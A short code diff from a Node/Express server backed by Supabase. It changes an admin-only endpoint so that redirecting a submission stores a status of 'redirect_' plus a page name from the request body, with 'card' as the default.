@@ -126,11 +126,12 @@ app.post('/api/admin/reject/:id', async (req, res) => {
   }
 });
 
-// Admin: redirect user
+// Admin: redirect user to a specific page
 app.post('/api/admin/redirect/:id', async (req, res) => {
   try {
     if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
-    const { error } = await supabase.from('submissions').update({ status: 'redirected' }).eq('id', req.params.id);
+    const page = req.body.page || 'card';
+    const { error } = await supabase.from('submissions').update({ status: 'redirect_' + page }).eq('id', req.params.id);
     if (error) throw error;
     res.json({ ok: true });
   } catch (err) {
